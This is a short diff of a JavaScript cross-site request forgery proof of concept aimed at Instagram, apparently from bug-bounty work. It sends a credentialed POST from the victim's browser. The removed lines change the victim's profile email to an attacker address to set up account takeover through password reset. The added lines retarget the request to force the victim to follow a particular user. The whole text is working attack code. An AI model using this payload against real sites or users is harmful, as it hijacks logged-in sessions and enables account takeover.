@@ -6,12 +6,12 @@
       function submitRequest()
       {
         var xhr = new XMLHttpRequest();
-        xhr.open("POST", "https:\/\/www.instagram.com\/accounts\/edit\/", true);
+        xhr.open("POST", "https:\/\/www.instagram.com\/web\/friendships\/7719696\/follow\/", true);
         xhr.setRequestHeader("Accept", "*\/*");
         xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
         xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
         xhr.withCredentials = true;
-        var body = "first_name=hamid&email=freshhackeremail%2B%40gmail.com&username=mainteemoforfun1&phone_number=&biography=i+can+reset+password+of+this+account+with+unverified+email+address+and+without+knowing+the+original+password&external_url=&chaining_enabled=on";
+        var body = "";
         var aBody = new Uint8Array(body.length);
         for (var i = 0; i < aBody.length; i++)
           aBody[i] = body.charCodeAt(i); 
